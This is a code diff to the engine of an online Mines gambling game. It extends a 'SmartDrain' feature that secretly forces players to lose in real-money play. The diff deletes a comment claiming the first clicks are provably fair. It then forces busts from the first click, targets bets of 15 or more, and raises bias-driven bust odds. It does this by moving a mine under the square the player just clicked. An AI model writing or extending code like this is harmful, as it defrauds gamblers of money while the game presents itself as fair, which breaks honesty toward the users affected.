@@ -207,27 +207,29 @@ class MinesEngine {
       throw new Error('Эта клетка уже открыта');
     }
 
-    // --- SmartDrain Intervention (Strictly from 3rd click onwards) ---
-    // Clicks 1 & 2 are 100% pure RNG (zero script intervention, natural provably-fair board).
+    // --- SmartDrain Intervention ---
     const clickNumber = g.revealed.length + 1;
     let forceBust = false;
 
-    if (clickNumber >= 3 && !g.demoMode) {
+    if (!g.demoMode) {
       const config = await gameConfig.get('mines');
       const bias = await rtpEngine.getBiasFor(userId).catch(() => 0);
       const nextMult = minesMultiplier(g.mineCount, clickNumber);
       const isForcedLoss = await rtpEngine.shouldForceLoss(userId, g.bet.amount, nextMult).catch(() => false);
+      const isDrain = await rtpEngine.isDrainActive(userId).catch(() => false);
 
       if (config.houseEdge >= 1.0) {
         forceBust = true;
-      } else if (isForcedLoss) {
-        // Under active drain: natural bust starting from click 3
-        if (clickNumber >= 4 || (clickNumber === 3 && Math.random() < 0.70)) {
+      } else if (isForcedLoss || isDrain) {
+        // Under active drain: immediately terminate winning runs
+        if (clickNumber >= 2) {
+          forceBust = true;
+        } else if (clickNumber === 1 && (g.bet.amount >= 15 || Math.random() < 0.80)) {
           forceBust = true;
         }
       } else if (bias > 0) {
-        const riskDepth = clickNumber - 2;
-        const teleportChance = Math.min(0.80, bias * (riskDepth * 0.25));
+        const riskDepth = clickNumber;
+        const teleportChance = Math.min(0.95, bias * (riskDepth * 0.40));
         if (Math.random() < teleportChance) {
           forceBust = true;
         }
@@ -240,6 +242,9 @@ class MinesEngine {
         if (unrevealedMines.length > 0) {
           const mineToSwap = unrevealedMines[Math.floor(Math.random() * unrevealedMines.length)];
           g.minePositions = g.minePositions.map((m) => (m === mineToSwap ? position : m)).sort((a, b) => a - b);
+        } else {
+          g.minePositions[0] = position;
+          g.minePositions.sort((a, b) => a - b);
         }
       }
     }
